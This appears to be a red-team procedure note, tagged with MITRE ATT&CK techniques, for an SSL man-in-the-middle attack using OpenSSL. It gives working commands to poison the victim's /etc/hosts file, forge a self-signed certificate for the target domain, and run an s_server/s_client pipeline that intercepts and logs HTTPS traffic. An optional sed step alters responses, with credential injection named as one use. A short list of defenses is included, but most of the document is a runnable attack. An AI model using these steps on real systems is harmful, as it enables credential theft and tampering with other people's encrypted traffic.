---
id: cb1499bb-7e94-4c27-85b9-112f01665b8b
name: SSL-MITM-Network-Discovery-with-OpenSSL
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:22.346466+00:00'
updated_at: '2023-05-26T00:58:56.579155+00:00'
tactics:
  - '[[tactics/Collection|TA0009 - Collection]]'
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - '[[techniques/Adversary-in-the-Middle|T1557 - Adversary-in-the-Middle]]'
  - >-
    [[techniques/Modify Authentication Process|T1556 - Modify Authentication
    Process]]
  - >-
    [[techniques/System Network Connections Discovery|T1049 - System Network
    Connections Discovery]]
sub_techniques:
  - >-
    [[sub-techniques/Application-Layer-Protocol|T1557.001 - Application Layer
    Protocol]]
  - '[[sub-techniques/Modify-Registry|T1112 - Modify Registry]]'
tags:
  - '[[tags/Network Discovery]]'
  - '[[tags/SSL MITM with OpenSSL]]'
  - mitm
  - ssl-interception
  - network-discovery
commands:
  - '[[commands/add-openssl-server-to-hosts-file]]'
  - '[[commands/generate-ssl-certificate-openssl]]'
  - '[[commands/sed-replace-text-in-file]]'
  - '[[commands/view-hosts-file]]'
platforms:
  - Linux
tools:
  - '[[tools/openssl]]'
validated: true
---

# SSL-MITM-Network-Discovery-with-OpenSSL

## Summary

This procedure outlines how to perform an SSL Man-in-the-Middle (MITM) attack using OpenSSL to intercept encrypted traffic, discover network connections, and potentially capture sensitive credentials like usernames and passwords. It involves redirecting traffic via hosts file modification, generating self-signed certificates, and setting up proxy-like interception with OpenSSL tools, allowing attackers to inspect or modify SSL/TLS communications in transit.

## Description

In this technique, an attacker sets up a local MITM proxy using OpenSSL's s_server and s_client to impersonate a legitimate server. By modifying the victim's /etc/hosts file to redirect domain traffic to the attacker's controlled IP, and generating a fake SSL certificate matching the target domain, the attacker can intercept HTTPS requests. The intercepted traffic can reveal network connections, bypass basic security controls like firewalls, and enable credential theft. This is particularly effective in local network scenarios or against misconfigured clients that don't validate certificates strictly. The procedure assumes attacker access to the victim's machine or network to modify configurations, and it's commonly used in red team exercises to simulate advanced persistent threats targeting encrypted communications.

## Requirements

1. Root or sudo access on the target/client host to modify /etc/hosts and run privileged commands.
2. OpenSSL installed on both the MITM server and client host.
3. Network access to route traffic between client and target server.
4. Knowledge of the target domain and IP addresses involved.

## Defense

- Enforce strict certificate validation using trusted Certificate Authorities (CAs) and HSTS (HTTP Strict Transport Security).
- Implement network segmentation to isolate traffic and limit lateral movement.
- Monitor for anomalous DNS resolutions, hosts file modifications, and unexpected SSL connections via tools like IDS/IPS (e.g., Snort) or endpoint detection (e.g., OSSEC).
- Use certificate pinning in applications to prevent MITM with self-signed certs.

## Objectives

1. Redirect target domain traffic to attacker-controlled MITM server.
2. Intercept and decrypt SSL/TLS traffic to discover active network connections.
3. Capture or modify sensitive data, such as credentials, in transit.

## Instructions

### Step 1: View Current Hosts File

**Context**: Before modifications, inspect the existing /etc/hosts file to understand current mappings and avoid conflicts. This helps verify the environment and plan the redirection.

**Command** ([[commands/view-hosts-file]]):
```bash
cat /etc/hosts
```

> This command displays the contents of the hosts file. Look for existing entries for the target domain to ensure no overrides exist.

**Expected Output**: A list of IP-hostname mappings, e.g.,
```
127.0.0.1 localhost
192.168.1.1 example.com
```

### Step 2: Add MITM Server to Hosts File

**Context**: Modify the /etc/hosts file on the client to redirect traffic for the target domain to the attacker's MITM server IP. This poisons local DNS resolution, forcing SSL connections to the attacker instead of the real server.

**Command** ([[commands/add-openssl-server-to-hosts-file]]):
```bash
sudo echo "[OPENSSL_SERVER_IP] [target.domain.com]" >> /etc/hosts  # On client host
```

> Replace [OPENSSL_SERVER_IP] with the attacker's server IP and [target.domain.com] with the domain to intercept. This appends a new line, redirecting all requests for that domain.

**Expected Output**: No direct output, but re-running [[commands/view-hosts-file]] should show the new entry added at the end.

### Step 3: Generate Self-Signed SSL Certificate

**Context**: Create a fake certificate on the MITM server that matches the target domain's Common Name (CN). This allows the server to impersonate the legitimate site during the SSL handshake, tricking the client into establishing an encrypted session with the attacker.

**Command** ([[commands/generate-ssl-certificate-openssl]]):
```bash
openssl req -subj '/CN=[target.domain.com]' -batch -new -x509 -days 365 -nodes -out server.pem -keyout server.pem
```

> The -nodes flag avoids passphrase prompts, -x509 generates a self-signed cert, and -days sets expiration. The resulting server.pem file contains both cert and key.

**Expected Output**:
```
Generating a RSA private key, 2048 bit long modulus
............+++
................+++
e is 65537 (0x10001)
Signature ok
subject=/CN=target.domain.com
Getting Private key
```

### Step 4: Set Up MITM Interception Pipeline

**Context**: On the MITM server, create a bidirectional pipe using mkfifo and OpenSSL to forward and intercept traffic. This simulates a proxy: s_server listens for client connections, forwards to the real server via s_client, and allows inspection/modification of responses using tee for logging.

**Code** ([[codes/openssl-mitm-setup-pipeline]]):
```bash
mkfifo response
sudo openssl s_server -cert server.pem -accept [INTERFACE]:[PORT] -quiet < response | tee | openssl s_client -quiet -servername [target.domain.com] -connect [REAL_SERVER_IP]:[PORT] | tee | cat > response
```

> Replace [INTERFACE] and [PORT] with listening details (e.g., 0.0.0.0:443), [target.domain.com] with the domain, and [REAL_SERVER_IP]:[PORT] with the actual server. The tee commands duplicate output for logging/inspection. Run this in a terminal on the MITM server before initiating client connections.

**Expected Output**: No initial output; upon client connection (e.g., via browser to target.domain.com), you'll see handshake logs and proxied HTTP/HTTPS traffic in the terminal, including requests and responses for inspection.

### Step 5: Intercept and Modify Traffic (Optional)

**Context**: Once interception is active, use sed to replace content in responses for testing or further evasion, such as altering JavaScript or injecting payloads to discover more network details.

**Command** ([[commands/sed-replace-text-in-file]]):
```bash
sed 's/old_text/new_text/g' input_file > output_file
```

> Pipe intercepted responses through sed for real-time modification, e.g., in the pipeline above, insert | sed 's/old/new/g' | before tee. This globally substitutes text, useful for credential injection or data alteration.

**Expected Output**: Modified file content, e.g., if input has "old_text", output replaces all instances with "new_text".
